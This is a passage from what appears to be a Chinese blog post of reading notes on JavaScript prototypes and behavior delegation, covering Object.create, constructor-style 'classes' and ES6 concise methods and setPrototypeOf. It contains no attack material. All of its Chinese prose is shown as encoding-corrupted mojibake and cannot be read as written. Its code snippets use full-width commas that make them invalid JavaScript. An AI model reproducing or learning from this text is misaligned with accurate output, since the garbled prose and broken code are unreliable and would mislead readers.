class="headerlink" title="5.5 å°ç»“"></a>5.5 å°ç»“</h3><ul><li>å¦‚æœè¦è®¿é—®å¯¹è±¡ä¸­å¹¶ä¸å­˜åœ¨çš„ä¸€ä¸ªå±æ€§ï¼Œ**[[Get]] æ“ä½œ(å‚è§ç¬¬ 3 ç« )å°±ä¼šæŸ¥æ‰¾å¯¹è±¡å†…éƒ¨[[Prototype]] å…³è”çš„å¯¹è±¡ã€‚** è¿™ä¸ªå…³è”å…³ç³»å®é™…ä¸Šå®šä¹‰äº†ä¸€æ¡â€œåŸå‹é“¾â€(æœ‰ç‚¹åƒåµŒå¥—çš„ä½œç”¨åŸŸé“¾)ï¼Œåœ¨æŸ¥æ‰¾å±æ€§æ—¶ä¼šå¯¹å®ƒè¿›è¡Œéå†ã€‚</li><li><strong>æ‰€æœ‰æ™®é€šå¯¹è±¡éƒ½æœ‰å†…ç½®çš„ Object.prototypeï¼Œ</strong> æŒ‡å‘åŸå‹é“¾çš„é¡¶ç«¯(æ¯”å¦‚è¯´å…¨å±€ä½œç”¨åŸŸ)ï¼Œå¦‚ æœåœ¨åŸå‹é“¾ä¸­æ‰¾ä¸åˆ°æŒ‡å®šçš„å±æ€§å°±ä¼šåœæ­¢ã€‚toString()ã€valueOf() å’Œå…¶ä»–ä¸€äº›é€šç”¨çš„åŠŸèƒ½ éƒ½å­˜åœ¨äº Object.prototype å¯¹è±¡ä¸Šï¼Œå› æ­¤è¯­è¨€ä¸­æ‰€æœ‰çš„å¯¹è±¡éƒ½å¯ä»¥ä½¿ç”¨å®ƒä»¬ã€‚</li><li>å…³è”ä¸¤ä¸ªå¯¹è±¡æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ new å…³é”®è¯è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œåœ¨è°ƒç”¨çš„ 4 ä¸ªæ­¥éª¤(ç¬¬ 2 ç« )ä¸­ä¼šåˆ›å»ºä¸€ä¸ªå…³è”å…¶ä»–å¯¹è±¡çš„æ–°å¯¹è±¡ã€‚</li><li>ä½¿ç”¨ new è°ƒç”¨å‡½æ•°æ—¶ä¼šæŠŠæ–°å¯¹è±¡çš„ .prototype å±æ€§å…³è”åˆ°â€œå…¶ä»–å¯¹è±¡â€(å°±æ˜¯æ„é€ å‡½æ•°prototypeæ‰€æŒ‡çš„å¯¹è±¡)ã€‚å¸¦ new çš„å‡½æ•°è°ƒç”¨ é€šå¸¸è¢«ç§°ä¸ºâ€œæ„é€ å‡½æ•°è°ƒç”¨â€ï¼Œå°½ç®¡å®ƒä»¬å®é™…ä¸Šå’Œä¼ ç»Ÿé¢å‘ç±»è¯­è¨€ä¸­çš„ç±»æ„é€ å‡½æ•°ä¸ä¸€æ ·ã€‚</li><li>JavaScript ä¸­çš„æœºåˆ¶æœ‰ä¸€ä¸ªæ ¸å¿ƒåŒºåˆ«ï¼Œé‚£å°±æ˜¯ä¸ä¼šè¿›è¡Œå¤åˆ¶ï¼Œå¯¹è±¡ä¹‹é—´æ˜¯é€šè¿‡å†…éƒ¨çš„ [[Prototype]] é“¾å…³è”çš„ã€‚</li><li>â€œå§”æ‰˜â€æ˜¯ä¸€ä¸ªæ›´åˆé€‚çš„æœ¯è¯­ï¼Œå› ä¸ºå¯¹è±¡ä¹‹é—´çš„å…³ç³»ä¸æ˜¯å¤åˆ¶è€Œæ˜¯å§”æ‰˜ã€‚</li></ul><h2 id="ç¬¬å…­ç« -è¡Œä¸ºå§”æ‰˜"><a href="#ç¬¬å…­ç« -è¡Œä¸ºå§”æ‰˜" class="headerlink" title="ç¬¬å…­ç«  è¡Œä¸ºå§”æ‰˜"></a>ç¬¬å…­ç«  è¡Œä¸ºå§”æ‰˜</h2><p>ç¬¬ 5 ç« çš„ç»“è®º:[[Prototype]] æœºåˆ¶å°±æ˜¯æŒ‡å¯¹è±¡ä¸­çš„ä¸€ä¸ªå†…éƒ¨é“¾æ¥å¼•ç”¨å¦ä¸€ä¸ªå¯¹è±¡ã€‚æ¢å¥è¯è¯´ï¼ŒJavaScript ä¸­è¿™ä¸ªæœºåˆ¶çš„æœ¬è´¨å°±æ˜¯å¯¹è±¡ä¹‹é—´çš„å…³è”å…³ç³»ã€‚åœ¨ç¬¬å…­ç« åˆè¢«ç§°ä¸ºå§”æ‰˜.<br>PS:å‰é¢åœ¨è®²åŸå‹çš„æ—¶å€™æˆ‘å°±ä¹ æƒ¯ç”¨çˆ¶å¯¹è±¡æŒ‡ä»£åŸå‹å¯¹è±¡(ç±»ä¼¼â€çˆ¶ç±»â€)ï¼Œç”¨å­å¯¹è±¡æŒ‡ä»£å…¶å®ä¾‹å¯¹è±¡(ç±»ä¼¼â€å­ç±»â€).æœ¬ç« ä¹Ÿå°†é‡‡ç”¨è¿™ç§ç§°å‘¼ï¼Œæ•…ä¸‹é¢ä¸å†è¯´æ˜.(å…¶å®æˆ‘è§‰å¾—ç”¨çˆ¶å¯¹è±¡å’Œå­å¯¹è±¡ç§°å‘¼æ›´å½¢è±¡)</p><h3 id="6-1-é¢å‘å§”æ‰˜çš„è®¾è®¡"><a href="#6-1-é¢å‘å§”æ‰˜çš„è®¾è®¡" class="headerlink" title="6.1 é¢å‘å§”æ‰˜çš„è®¾è®¡"></a>6.1 é¢å‘å§”æ‰˜çš„è®¾è®¡</h3><p>ä¸€å¥è¯:[[Prototype]]æœºåˆ¶æ˜¯é¢å‘å§”æ‰˜çš„è®¾è®¡ï¼Œæ˜¯ä¸åŒäºé¢å‘ç±»çš„è®¾è®¡. ä¸‹é¢å°†åˆ†åˆ«ä»‹ç»ç±»ç†è®ºå’Œå§”æ‰˜ç†è®º.</p><h4 id="6-1-1-ç±»ç†è®º"><a href="#6-1-1-ç±»ç†è®º" class="headerlink" title="6.1.1 ç±»ç†è®º"></a>6.1.1 <strong>ç±»ç†è®º</strong></h4><p><strong>ç±»ç†è®ºè®¾è®¡æ–¹æ³•:</strong> é¦–å…ˆå®šä¹‰ä¸€ä¸ªé€šç”¨çˆ¶(åŸº)ç±»ï¼Œåœ¨ çˆ¶ç±»ç±»ä¸­å®šä¹‰æ‰€æœ‰ä»»åŠ¡éƒ½æœ‰(é€šç”¨)çš„è¡Œä¸ºã€‚æ¥ç€å®šä¹‰å­ç±» ï¼Œå®ƒä»¬éƒ½ç»§æ‰¿è‡ª çˆ¶ç±»å¹¶ä¸”ä¼šæ·»åŠ ä¸€äº›ç‰¹æ®Šçš„è¡Œä¸ºæ¥å¤„ç†å¯¹åº”çš„ä»»åŠ¡ï¼Œå¹¶ä¸”åœ¨ç»§æ‰¿æ—¶å­ç±»å¯ä»¥ä½¿ç”¨æ–¹æ³•é‡å†™(å’Œå¤šæ€)çˆ¶ç±»çš„è¡Œä¸º.        </p><p>ç±»ç†è®ºä¸­è®¸å¤šè¡Œä¸ºå¯ä»¥<strong>å…ˆâ€œæŠ½è±¡â€åˆ°çˆ¶ç±»ç„¶åå†ç”¨å­ç±»è¿›è¡Œç‰¹æ®ŠåŒ–(é‡å†™)ã€‚</strong><br>ps:è¿™éƒ¨åˆ†äº†è§£å³å¯ï¼Œç€é‡ç†è§£ä¸‹é¢JavaScriptç”¨åˆ°çš„å§”æ‰˜.</p><h4 id="6-1-2-å§”æ‰˜ç†è®º"><a href="#6-1-2-å§”æ‰˜ç†è®º" class="headerlink" title="6.1.2 å§”æ‰˜ç†è®º"></a>6.1.2 <strong>å§”æ‰˜ç†è®º</strong></h4><p><strong>ç±»ç†è®ºè®¾è®¡æ–¹æ³•:</strong> é¦–å…ˆä½ ä¼šå®šä¹‰ä¸€ä¸ªâ€çˆ¶â€å¯¹è±¡(ç›¸å½“äºä¸ŠèŠ‚ä¸­çš„çˆ¶ç±»)ï¼Œå®ƒä¼šåŒ…å«æ‰€æœ‰ä»»åŠ¡éƒ½å¯ä»¥ä½¿ç”¨(å§”æ‰˜)çš„å…·ä½“è¡Œä¸ºã€‚æ¥ç€ï¼Œå¯¹äº<strong>æ¯ä¸ªä»»åŠ¡</strong>ä½ éƒ½å¯ä»¥å®šä¹‰ä¸€ä¸ªå¯¹è±¡(â€œå­â€å¯¹è±¡)æ¥å­˜å‚¨å¯¹åº”çš„æ•°æ®å’Œè¡Œä¸ºã€‚ä½ å¯ä»¥æŠŠç‰¹å®šçš„ä»»åŠ¡å¯¹è±¡éƒ½å…³è”åˆ°çˆ¶å¯¹è±¡ä¸Šï¼Œè®©å®ƒä»¬åœ¨éœ€è¦çš„æ—¶å€™å¯ä»¥è¿›è¡Œå§”æ‰˜ã€‚    (å…¶å®æˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯ç”¨çˆ¶å¯¹è±¡æ¥å®šä¹‰é€šç”¨çš„æ–¹æ³•ï¼Œå­å¯¹è±¡è¿›è¡Œå§”æ‰˜.ç„¶åå­å¯¹è±¡è‡ªèº«ä¸ªæ€§çš„å±æ€§æ–¹æ³•å°±å†™åœ¨å­å¯¹è±¡æœ¬èº«ï¼Œå¹¶é¿å…ä¸çˆ¶å¯¹è±¡çš„å±æ€§åå†²çª)        </p><p><strong>ps:</strong> è¿™èŠ‚ä¹¦ä¸­è¿™æ®µè¯<code>ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦æŠŠè¿™äº›è¡Œä¸ºæ”¾åœ¨ä¸€èµ·ï¼Œ**é€šè¿‡ç±»çš„å¤åˆ¶**ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒä»¬åˆ†åˆ«æ”¾åœ¨å„è‡ªç‹¬ç«‹ çš„å¯¹è±¡ä¸­ï¼Œéœ€è¦æ—¶å¯ä»¥å…è®¸ XYZ å¯¹è±¡å§”æ‰˜ç»™ Taskã€‚</code>æœ‰ä¸ªé”™è¯¯.â€é€šè¿‡ç±»çš„å¤åˆ¶â€åº”è¯¥æ”¹ä¸ºâ€é€šè¿‡â€[[Prototype]]æœºåˆ¶â€.è¿™é‡Œåº”è¯¥æ˜¯ä½œè€…çš„æ‰‹è¯¯.<br>åœ¨ JavaScript ä¸­ï¼Œ[[Prototype]] æœºåˆ¶ä¼šæŠŠå¯¹è±¡å…³è”åˆ°å…¶ä»–å¯¹è±¡ã€‚æ— è®ºä½ å¤šä¹ˆåŠªåŠ›åœ°è¯´æœè‡ª å·±ï¼ŒJavaScript ä¸­å°±æ˜¯æ²¡æœ‰ç±»ä¼¼â€œç±»â€çš„æŠ½è±¡æœºåˆ¶ã€‚(å…¶å®ä¸»è¦åŸå› è¿˜æ˜¯æ˜¯JavaScriptæ²¡æœ‰å®Œæ•´çš„å¤åˆ¶æœºåˆ¶)</p><p><strong>å§”æ‰˜ç†è®ºçš„ä½¿ç”¨å»ºè®®:</strong><br>PS:ä¹¦ä¸­è¿™é‡Œå†™äº†3æ¡ï¼Œå…¶å®åªæœ‰2æ¡ï¼Œç¬¬ä¸‰æ¡ä¸è¿‡æ˜¯å¯¹ç¬¬ä¸€æ¡çš„è¯´æ˜ï¼Œè¿™é‡Œæˆ‘è¿›è¡Œäº†åˆå¹¶.</p><ul><li><ol><li>é€šå¸¸æ¥è¯´ï¼Œåœ¨ [[Prototype]] å§”æ‰˜ä¸­æœ€å¥½<strong>æŠŠçŠ¶æ€ä¿å­˜åœ¨å§”æ‰˜è€…(å­å¯¹è±¡)è€Œä¸æ˜¯å§”æ‰˜ç›®æ ‡(çˆ¶å¯¹è±¡)ä¸Š</strong>ã€‚é‚£æ€ä¹ˆå®ç°å‘¢ï¼Œå°±æ˜¯é€šè¿‡â€this çš„éšå¼ç»‘å®šâ€.<strong>åœ¨å§”æ‰˜ç›®æ ‡(çˆ¶å¯¹è±¡)ä¸Šçš„å‡½æ•°é‡Œé€šè¿‡thiså®šä¹‰ä¿å­˜çŠ¶æ€</strong>.å½“å§”æ‰˜è€…(å­å¯¹è±¡)å¼•ç”¨è¯¥å‡½æ•°æ–¹æ³•æ—¶ï¼Œæ­¤æ—¶çš„thiså°±è‡ªåŠ¨ç»‘å®šåˆ°å§”æ‰˜è€…ä¸Šäº†.</li></ol></li><li><ol start="2"><li> åœ¨å§”æ‰˜ä¸­æˆ‘ä»¬ä¼šå°½é‡é¿å…åœ¨ [[Prototype]] é“¾çš„ä¸åŒçº§åˆ«ä¸­ä½¿ç”¨ç›¸åŒçš„å‘½åï¼Œå¦åˆ™å°±éœ€è¦ä½¿ç”¨ç¬¨æ‹™å¹¶ä¸”è„†å¼±çš„è¯­æ³•æ¥æ¶ˆé™¤å¼•ç”¨æ­§ä¹‰(å‚è§ç¬¬ 4 ç« )ã€‚</li></ol></li><li><strong>è¡¥å……</strong>: 3. åœ¨ API æ¥å£çš„è®¾è®¡ä¸­ï¼Œ<strong>å§”æ‰˜æœ€å¥½åœ¨å†…éƒ¨å®ç°ï¼Œä¸è¦ç›´æ¥æš´éœ²å‡ºå»ã€‚</strong> è¿™ä¹ˆåšæ›´å¤šçš„æ˜¯å‡ºäºå®‰å…¨å’Œæ¥å£ç¨³å®šçš„è€ƒè™‘.å»ºè®®<strong>å­å¯¹è±¡å°†æ‰€æœ‰å¼•ç”¨çˆ¶å¯¹è±¡çš„æ–¹æ³•éƒ½å¥—ä¸ªå‡½æ•°éšè—èµ·æ¥ï¼Œå¹¶å–ä¸€ä¸ªè¯­ä¹‰åŒ–çš„å±æ€§å.</strong></li></ul><p><strong>å§”æ‰˜ç†è®ºçš„ä½¿ç”¨æ³¨æ„:</strong></p><ul><li><ol><li><strong>ç¦æ­¢ä¸¤ä¸ªå¯¹è±¡äº’ç›¸å§”æ‰˜</strong>:å½“ä½ å°†ç¬¬äºŒä¸ªå¯¹è±¡åå‘å§”æ‰˜ç»™å‰ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå°±ä¼šæŠ¥é”™.</li></ol></li><li><ol start="2"><li><strong>è°ƒè¯•</strong>: è¿™ä¸ªäº†è§£ä¸‹å°±è¡Œ.çŸ¥é“ä¸åŒæµè§ˆå™¨å’Œå·¥å…·å¯¹å§”æ‰˜çš„è§£æç»“æœå¹¶ä¸ä¸€å®šç›¸åŒ.(åæ§½:çœ‹äº†åŠå¤©åˆ°åé¢å‡ºç°<code>å®é™…ä¸Šï¼Œåœ¨ç¼–å†™æœ¬ä¹¦æ—¶ï¼Œè¿™ä¸ªè¡Œä¸ºè¢«è®¤å®šæ˜¯ Chrome çš„ä¸€ä¸ª bugï¼Œ å½“ä½ è¯»åˆ°æ­¤ä¹¦æ—¶ï¼Œå®ƒå¯èƒ½å·²ç»è¢«ä¿®å¤äº†ã€‚</code>æˆ‘åªæƒ³è¯´WTF! å¥½å§ï¼Œæˆ‘çŸ¥é“chromeä»¥å‰å¯èƒ½å‡ºç°è¿‡è¿™ä¸ªâ€bugâ€äº†=.=)</li></ol></li></ul><h4 id="6-1-3-æ¯”è¾ƒæ€ç»´æ¨¡å‹"><a href="#6-1-3-æ¯”è¾ƒæ€ç»´æ¨¡å‹" class="headerlink" title="6.1.3 æ¯”è¾ƒæ€ç»´æ¨¡å‹"></a>6.1.3 <strong>æ¯”è¾ƒæ€ç»´æ¨¡å‹</strong></h4><p>è¿™èŠ‚ä¸»è¦æ˜¯æ¯”è¾ƒäº†â€é€šè¿‡æ„é€ å‡½æ•°(æ¨¡æ‹Ÿç±»)å®ç°åŸå‹ç»§æ‰¿â€ä¸â€é€šè¿‡å¯¹è±¡å…³è”(å§”æ‰˜å½¢å¼ï¼ŒObject.create( â€¦ ))å®ç°åŸå‹ç»§æ‰¿â€ä¸¤ç§æ–¹å¼çš„åŒºåˆ«.</p><p><strong>ç»“è®º:</strong> é€šè¿‡å¯¹è±¡å…³è”ï¼Œå§”æ‰˜å½¢å¼ï¼Œæ›´åŠ ç®€æ´ï¼Œæ›´åŠ æ¸…æ™°æ˜“æ‡‚.</p><p>PS:è¿™é‡Œæˆ‘åŸæœ¬è‡ªå·±å¯¹ä¾‹å­ç”»å‡ºåŸå‹ç¤ºæ„å›¾.ä½†æ˜¯å‘ç°æ˜¯çœŸçš„å¤æ‚ï¼Œå¹¶ä¸”å’Œä¹¦ä¸­ç®€æ´åçš„ç¤ºæ„å›¾æ˜¯å·®ä¸å¤šçš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸å±•ç¤ºäº†ï¼Œå…å¾—è®©è¯»è€…çœ‹å¾—æ›´å¤´å¤§.è¿™é‡Œå»ºè®®ï¼Œè¯»è€…è‡ªå·±åœ¨è‰ç¨¿çº¸ä¸Šç”»å‡ºåŸå‹ç¤ºæ„å›¾.</p><h3 id="6-2-ç±»ä¸å¯¹è±¡"><a href="#6-2-ç±»ä¸å¯¹è±¡" class="headerlink" title="6.2 ç±»ä¸å¯¹è±¡"></a>6.2 ç±»ä¸å¯¹è±¡</h3><p>å…¶å®è¿™èŠ‚è®²å¾—è¿˜æ˜¯â€é€šè¿‡æ„é€ å‡½æ•°(æ¨¡æ‹Ÿç±»)å®ç°åŸå‹ç»§æ‰¿â€ä¸â€é€šè¿‡å¯¹è±¡å…³è”(å§”æ‰˜å½¢å¼ï¼ŒObject.create( â€¦ ))å®ç°åŸå‹ç»§æ‰¿â€ä¸¤ç§æ–¹å¼çš„åŒºåˆ«.ä¸è¿‡è¿™æ¬¡ä¸»è¦æ˜¯ä»¥å‰ç«¯å®é™…ä½¿ç”¨åœºæ™¯è¿›è¡Œè®²è§£.</p><h4 id="6-2-1-æ§ä»¶â€œç±»â€"><a href="#6-2-1-æ§ä»¶â€œç±»â€" class="headerlink" title="6.2.1 æ§ä»¶â€œç±»â€"></a>6.2.1 <strong>æ§ä»¶â€œç±»â€</strong></h4><p>è¿™é‡Œæˆ‘å°±ä¸ä»¥ä¹¦ä¸­çš„ä¾‹å­è¿›è¡Œè®²è§£äº†ï¼Œè€Œæ˜¯ç›´æ¥ç«™åœ¨æ›´é«˜çš„è§’åº¦å¯¹è¿™ç§â€ç±»â€é£æ ¼çš„ä»£ç è¿›è¡Œè®²è§£.<br><strong>æœ€å¤§ç‰¹ç‚¹:</strong> 1æ˜¯é€šè¿‡æ„é€ å‡½æ•°è¿›è¡Œæ¨¡æ‹Ÿç±»ï¼Œ2æ˜¯é€šè¿‡æ˜¾å¼ä¼ªå¤šæ€(ç¡¬ç»‘å®šå‡½æ•°)å…³è”ä¸¤ä¸ªå‡½æ•°.<br><strong>æ³¨æ„:</strong> </p><ul><li><strong>ä¸ç®¡æ˜¯ç±»è¿˜æ˜¯å¯¹è±¡.è¿™ä¸¤ç§å½¢å¼ä¸€èˆ¬éƒ½éœ€è¦å®šä¹‰ä¸¤ç§æ•°æ®.ç¬¬ä¸€ç§å°±æ˜¯å®ä¾‹å¯¹è±¡è¦ç”¨åˆ°çš„â€åˆå§‹ä¿å­˜çš„æ•°æ®â€;ç¬¬äºŒç§å°±æ˜¯é€šç”¨è¡Œä¸ºçš„å®šä¹‰ï¼ŒåŒ…æ‹¬å¯¹å®ä¾‹å¯¹è±¡æ•°æ®çš„å¢åˆ æ”¹æŸ¥.</strong></li><li>ä¸‹é¢æåˆ°çš„æ˜¾å¼ä¼ªå¤šæ€(è¯¦è§ç¬¬å››ç« )ï¼Œå…¶å®æŒ‡çš„å°±æ˜¯ä½¿ç”¨call()æ–¹æ³•è¿™ç§ç¡¬ç»‘å®š.</li><li>æ³¨æ„ES6 classæ¨¡æ‹Ÿç±»çš„å†™æ³•æˆ‘å°±æ²¡å…·ä½“åˆ—å‡ºäº†.å®é™…ä¸Šclass ä»ç„¶æ˜¯é€šè¿‡ [[Prototype]] æœºåˆ¶å®ç°çš„ï¼Œä¸è¿‡æ˜¯ä¸ªè¡¨é¢ç®€æ´çš„è¯­æ³•ç³–.</li></ul><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b5e847b943c0%EF%BC%9Fw=1002&h=717&f=png&s=117669"></p><p>è™½ç„¶ä¹¦ä¸­å¯¹æ˜¾å¼ä¼ªå¤šæ€ç§°ä¸ºâ€ä¸‘é™‹çš„â€ï¼Œè¿˜ç”¨äº†ä¸€ä¸ªè¯­æ°”åŠ¨è¯â€å‘¸!â€.è™½ç„¶è¿™æ ·ä¸å¥½ï¼Œä½†æœ‰æ—¶ç”¨callçœŸçš„å¾ˆæ–¹ä¾¿ï¼Œæ‰€ä»¥ç”¨å¾—ä¹Ÿå¾ˆå¤š.</p><h4 id="6-2-2-å§”æ‰˜æ§ä»¶å¯¹è±¡"><a href="#6-2-2-å§”æ‰˜æ§ä»¶å¯¹è±¡" class="headerlink" title="6.2.2 å§”æ‰˜æ§ä»¶å¯¹è±¡"></a>6.2.2 <strong>å§”æ‰˜æ§ä»¶å¯¹è±¡</strong></h4><p><strong>æœ€å¤§ç‰¹ç‚¹:</strong> é€šè¿‡å¯¹è±¡è½½ä½“æ¥æ¨¡æ‹Ÿçˆ¶å­ï¼Œå¹¶<strong>é€šè¿‡Objectï¼Œcreate(â€¦)æ¥å¯¹ä¸¤ä¸ªå¯¹è±¡è¿›è¡Œå…³è”</strong>.å¹¶<strong>é€šè¿‡å§”æ‰˜çš„å½¢å¼è¿›è¡Œå¼•ç”¨</strong>.ä¸ä¸ŠèŠ‚ä¸­æåˆ°çš„ç±»å½¢å¼è¿˜æœ‰ä¸€ä¸ªåŒºåˆ«:å¯¹è±¡fooæ„å»ºåï¼Œéœ€è¦æ‰‹åŠ¨è°ƒç”¨setUpæ–¹æ³•è¿›è¡Œåˆå§‹åŒ–.æ•…å¯¹è±¡çš„æ„å»ºä¸åˆå§‹åŒ–æ˜¯åˆ†å¼€çš„.è€Œæ„é€ å‡½æ•°å½¢å¼åˆ™æ˜¯åœ¨new æ„é€ å‡½æ•°æ—¶ï¼Œ åŒæ—¶è¿›è¡Œäº†å¯¹è±¡æ„å»ºä¸åˆå§‹åŒ–.(å…³äºè¿™ç‚¹æˆ‘ä¸‹é¢è¿˜ä¼šå†è¯´æ˜çš„)</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b604328156c9%EF%BC%9Fw=789&h=822&f=png&s=132960"></p><p>å…³äºä¹¦ä¸­è¿™å¥<code>ä½¿ç”¨ç±»æ„é€ å‡½æ•°çš„è¯ï¼Œä½ éœ€è¦(å¹¶ä¸æ˜¯ç¡¬æ€§è¦æ±‚ï¼Œä½†æ˜¯å¼ºçƒˆå»ºè®®)åœ¨åŒä¸€ä¸ªæ­¥éª¤ä¸­å®ç°æ„é€ å’Œåˆå§‹åŒ–ã€‚ç„¶è€Œï¼Œåœ¨è®¸å¤šæƒ…å†µä¸‹æŠŠè¿™ä¸¤æ­¥åˆ†å¼€(å°±åƒå¯¹è±¡å…³è”ä»£ç ä¸€æ ·)æ›´çµæ´»ã€‚</code>çš„ç†è§£:ä½¿ç”¨ç±»æ„é€ å‡½æ•°å½¢å¼ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨<code>new æ„é€ å‡½æ•°</code>æ—¶ï¼Œå…¶å®æ˜¯åœ¨<strong>ä¸€æ­¥å®ç°</strong>å¯¹è±¡çš„æ„å»ºå’Œå¯¹è±¡æ•°æ®çš„åˆå§‹åŒ–(é€šè¿‡æ„é€ å‡½æ•°é‡Œçš„call) ;ä½¿ç”¨è¿™ç§å§”æ‰˜å½¢å¼ï¼Œæˆ‘ä»¬æ˜¯åˆ†åˆ«é€šè¿‡<code>Object.create( ... );</code>æ„å»ºå¯¹è±¡å’Œ<code>foo.setUp( ...);</code>æ¥åˆå§‹åŒ–çš„.å³æˆ‘ä»¬æ˜¯åˆ†ä¸¤æ­¥å®ç°çš„.è¿™æ ·åˆ†å¼€çš„è¯å…¶å®æ˜¯æ›´åŠ çµæ´»ï¼Œä¹Ÿæ›´ç¬¦åˆç¼–ç¨‹ä¸­çš„å…³æ³¨åˆ†ç¦»åŸåˆ™.</p><h3 id="6-3-æ›´ç®€æ´çš„è®¾è®¡"><a href="#6-3-æ›´ç®€æ´çš„è®¾è®¡" class="headerlink" title="6.3 æ›´ç®€æ´çš„è®¾è®¡"></a>6.3 æ›´ç®€æ´çš„è®¾è®¡</h3><p>è¿™èŠ‚ä¹Ÿæ˜¯ä¸€æ ·é€šè¿‡ä¸¤è€…çš„å¯¹æ¯”æ¥çªæ˜¾å§”æ‰˜è®¾è®¡æ¨¡å¼çš„å„ç§ä¼˜ç‚¹.è¿™é‡Œæˆ‘å°±ä¸å†å¯¹ä¹¦ä¸­çš„ä¾‹å­è¿›è¡Œè§£è¯».å¦‚æœä½ çœŸæ­£ç†è§£äº†ç±»å’Œå§”æ‰˜çš„è¯ï¼Œå…¶å®æ˜¯å¾ˆç®€å•çš„.å¦‚æœè§‰å¾—å¤æ‚çš„è¯ï¼Œå¯ä»¥åœ¨çº¸ä¸Šç†ä¸€ä¸‹å‡½æ•°å’Œå¯¹è±¡ä¹‹é—´çš„å…³ç³»ï¼Œä¸‹é¢æˆ‘å°±åªæ€»ç»“ä¸‹è¿™é‡Œæåˆ°å§”æ‰˜è®¾è®¡æ¨¡å¼çš„ä¼˜ç‚¹ï¼Œå½“ç„¶æ ¸å¿ƒæ˜¯æ›´ç®€æ´.</p><p><strong>ç®€æ´ä½“ç°åœ¨:</strong></p><ul><li>1ï¼Œ å§”æ‰˜é‡ç‚¹åœ¨äºåªéœ€è¦ä¸¤ä¸ªå®ä½“(ä¸¤ä¸ªå¯¹è±¡ç›¸äº’å…³è”)ï¼Œè€Œä¹‹å‰çš„â€ç±»â€æ¨¡å¼éœ€è¦ä¸‰ä¸ª(çˆ¶â€ç±»â€ï¼Œå­â€ç±»â€ï¼Œå®ä¾‹å¯¹è±¡)å…¶å®å¯ä»¥è¿™ä¹ˆç†è§£:å§”æ‰˜æ¨¡å¼å°†â€å­ç±»â€å’Œâ€å®ä¾‹å¯¹è±¡â€åˆä¸ºä¸€ä¸ªå¯¹è±¡äº†ã€‚</li><li>2ï¼Œ ä¸éœ€è¦åŸºç±»(çˆ¶ç±»)æ¥â€å…±äº«â€ä¸¤ä¸ªå®ä½“ä¹‹é—´çš„è¡Œä¸º.ä¸éœ€è¦å®ä¾‹åŒ–ç±»ï¼Œä¹Ÿä¸éœ€è¦åˆæˆ.å…¶å®è¿™ç¬¬äºŒæ¡å°±æ˜¯å¯¹ç¬¬ä¸€æ¡è¿™ç§ç»“æœçš„è¯´æ˜.</li><li>é¢å¤–è¡¥å……å¼ºè°ƒ:åœ¨ä½¿ç”¨æ„é€ å‡½æ•°æ¨¡æ‹Ÿç±»æ—¶ï¼Œå­ç±»é€šå¸¸ä¼šå¯¹çˆ¶ç±»çš„è¡Œä¸ºè¿›è¡Œé‡å†™(å±æ€§åç›¸åŒ);ä½†å§”æ‰˜æ¨¡å¼åˆ™ä¸ä¼šï¼Œå®ƒä¼šé‡æ–°å–ä¸ªå±æ€§åï¼Œå†å¼•ç”¨çˆ¶å¯¹è±¡ä¸Šçš„è¡Œä¸º.</li></ul><h3 id="6-4-æ›´å¥½çš„è¯­æ³•"><a href="#6-4-æ›´å¥½çš„è¯­æ³•" class="headerlink" title="6.4 æ›´å¥½çš„è¯­æ³•"></a>6.4 æ›´å¥½çš„è¯­æ³•</h3><p>è¿™èŠ‚ä¸»è¦æ˜¯ä»‹ç»ES6æä¾›çš„2ä¸ªç®€æ´å†™æ³•ä¸å…¶ä¸­çš„éšæ‚£.</p><p><strong>è¯­æ³•:</strong></p><ul><li>åœ¨ ES6 ä¸­æˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„å¯¹è±¡çš„å­—é¢å½¢å¼ä¸­ä½¿ç”¨ç®€æ´æ–¹æ³•å£°æ˜ï¼Œä¾‹å¦‚:</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> Foo = &#123;</span><br><span class="line">  <span class="function"><span class="title">bar</span>(<span class="params"></span>)</span> &#123; <span class="comment">/*..*/</span> &#125;ï¼Œ<span class="comment">//å­—é¢å½¢å¼å£°æ˜</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>åœ¨ ES6 ä¸­æˆ‘ä»¬å¯ä»¥ç”¨ Object. setPrototypeOf(..) æ¥ä¿®æ”¹å¯¹è±¡çš„ [[Prototype]]ï¼Œå…·ä½“ç”¨æ³•å¯ä»¥<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf">æŸ¥çœ‹MDN</a>ä¾‹å¦‚:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨æ›´å¥½çš„å¯¹è±¡å­—é¢å½¢å¼è¯­æ³•å’Œç®€æ´æ–¹æ³• </span></span><br><span class="line"><span class="keyword">var</span> AuthController = &#123;</span><br><span class="line">         <span class="attr">errors</span>: []ï¼Œ</span><br><span class="line">         <span class="function"><span class="title">checkAuth</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">           <span class="comment">// ... </span></span><br><span class="line">         &#125;ï¼Œ</span><br><span class="line">         <span class="function"><span class="title">server</span>(<span class="params">urlï¼Œdata</span>)</span> &#123;</span><br><span class="line">             <span class="comment">// ...</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// ... </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ç°åœ¨æŠŠ AuthController å…³è”åˆ° LoginController </span></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf( AuthControllerï¼Œ LoginController );</span><br></pre></td></tr></table></figure><p><strong>å¼Šç«¯:</strong></p><ul><li><strong>å¯¹è±¡å­—é¢å½¢å¼è¯­æ³•</strong>:å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°è¡¨è¾¾å¼.åŒ¿åå‡½æ•°ä¼šå¯¼è‡´3ä¸ªç¼ºç‚¹:1. 